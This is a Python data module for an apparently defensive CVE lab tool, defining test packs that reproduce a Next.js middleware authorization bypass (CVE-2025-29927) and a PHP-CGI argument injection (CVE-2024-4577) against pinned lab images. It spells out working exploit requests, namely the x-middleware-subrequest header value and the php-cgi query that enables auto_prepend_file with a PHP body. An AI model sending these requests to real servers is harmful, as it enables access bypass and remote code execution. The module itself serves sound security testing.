"""Reviewed managed-lab packs, versions and immutable image references.

Each entry in PACKS couples a reviewed vulnerable application with the
request that reproduces the vulnerability and the observations the evidence
classifier expects. Packs are data: landing a new pack means adding a reviewed
entry here plus the matching baseline gate and classifier, not new runner code.

Every ``application_image`` and ``runner_image`` must be pinned by digest;
``prepare`` refuses references without ``@sha256:``. A pack whose lab image
has not completed its build-and-review carries an explicit unreviewed tag and
``image_status`` so ``mockforge cve list`` states that plainly instead of
silently pulling an unpinned image.
"""

LABEL = "io.mockforge.cve.run"

PACKS = {
    "CVE-2025-29927": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2025-29927",
            "title": "Next.js middleware authorization bypass",
            "platform": "Linux, local Docker/Podman engine, amd64",
            "application_version": "Next.js 15.2.2 (Vulhub)",
            "application_image": "docker.io/vulhub/nextjs@sha256:f01608b225bcb7952f5e558c445b9bd76a3bfb385e11521d1a06ad4cbe08b4a8",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927",
                "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            ],
            "coverage": "One reviewed authorization-bypass case and benign controls; not all variants",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
        },
        "probe": {
            "template_id": "mockforge-nextjs-29927-observation",
            "template_name": "MockForge Next.js controlled lab observation",
            "method": "GET",
            "path": "/?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
                "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
            },
            "body": None,
            "signature_header": "x-middleware-subrequest",
            # Body marker proving the bypass reached the application.
            "marker": "Dashboard Content",
        },
        "app": {
            "port": "3000/tcp",
            "env": {"NODE_ENV": "production"},
            "readiness": {"path": "/login", "status": 200},
        },
        "controls": {
            "benign_path": "/login?__mockforge_cve={token}",
            "benign_status": 200,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 307,
        },
        "baseline_gate": "middleware-bypass",
        "classifier": "middleware-bypass",
    },
    "CVE-2024-4577": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2024-4577",
            "title": "PHP CGI argument injection via Windows best-fit codepage",
            "platform": "Linux amd64 host, local Docker/Podman engine, Wine-based Windows PHP lab image",
            "application_version": "PHP 8.3.7 cgi (Windows, vulnerable) under Wine; Apache httpd 2.4.70 CGI harness",
            # NOT a reviewed image yet: the tag is an explicit placeholder and
            # prepare/run refuse it until the digest below is replaced with the
            # reviewed lab-host build (see examples/cve-lab/cve-2024-4577-lab-image/).
            "application_image": "docker.io/mockforge/cve-lab-phpcgi-wine:pending-lab-host-review",
            "image_status": "pending-lab-host-review",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/advisories/GHSA-vxpp-6299-mxw3",
                "https://www.php.net/releases/8.3/release-8.3.8.php",
            ],
            "coverage": "One reviewed CGI argument-injection case and benign controls; not all codepages or handlers",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
        },
        "probe": {
            "template_id": "mockforge-phpcgi-4577-observation",
            "template_name": "MockForge PHP-CGI controlled lab observation",
            "method": "POST",
            # The exploit query must stay the entire query string: php-cgi's
            # argv-style parsing splits on '+', so any additional query
            # parameter would glue onto or hide the injected switches. The run
            # token rides the X-Mockforge-Cve header only.
            "path": "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput",
            "headers": {
                "X-Mockforge-Cve": "{token}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": "<?php echo 'MOCKFORGE-CVE-2024-4577'; ?>",
            "signature_header": None,
            # Body marker proving the injected PHP executed on the origin.
            "marker": "MOCKFORGE-CVE-2024-4577",
        },
        "app": {
            "port": "8080/tcp",
            "env": {},
            # Benign direct CGI access (no injected switches) is rejected by
            # the harness configuration; the reviewed image pins this status.
            "readiness": {"path": "/php-cgi/php-cgi.exe", "status": 404},
        },
        "controls": {
            "benign_path": "/php-cgi/php-cgi.exe?__mockforge_cve={token}",
            "benign_status": 404,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 200,
        },
        "baseline_gate": "cgi-argument-injection",
        "classifier": "cgi-argument-injection",
    },
}

def validate_data_driven_pack(pack):
    """Check a pack that uses the generic data-driven evidence path.

    A pack needs no classifier code when its outcome is a plain response
    status: it names ``data-driven`` for both ``baseline_gate`` and
    ``classifier`` and declares everything else as data. This validator
    enforces the shape so a wrongly declared pack fails loudly before any run
    instead of producing unverifiable verdicts.
    """
    if pack["baseline_gate"] != "data-driven" or pack["classifier"] != "data-driven":
        raise ValueError(
            "validate_data_driven_pack requires the data-driven gate and classifier"
        )
    for key in ("catalog", "probe", "app", "controls"):
        if key not in pack:
            raise ValueError(f"data-driven pack is missing {key}")
    for image in (pack["catalog"]["application_image"], pack["catalog"]["runner_image"]):
        if "@sha256:" not in image:
            raise ValueError(f"{image} is not pinned by digest")
    controls = pack["controls"]
    for key in ("benign_path", "benign_status", "ordinary_path", "ordinary_status"):
        if key not in controls:
            raise ValueError(f"data-driven pack controls are missing {key}")
    probe = pack["probe"]
    for key in ("template_id", "template_name", "method", "path", "marker"):
        if key not in probe:
            raise ValueError(f"data-driven pack probe is missing {key}")
    seen_ids = set()
    for case in pack.get("extra_cases", ()):
        for key in ("id", "path", "expect_status"):
            if key not in case:
                raise ValueError(f"extra case is missing {key}: {case}")
        if case["id"] in seen_ids:
            raise ValueError(f"duplicate extra case id: {case['id']}")
        seen_ids.add(case["id"])


# Legacy single-pack exports; existing callers and tests import these names.
CVE = "CVE-2025-29927"
CATALOG = PACKS[CVE]["catalog"]
SIGNATURE = PACKS[CVE]["probe"]["headers"]["x-middleware-subrequest"]
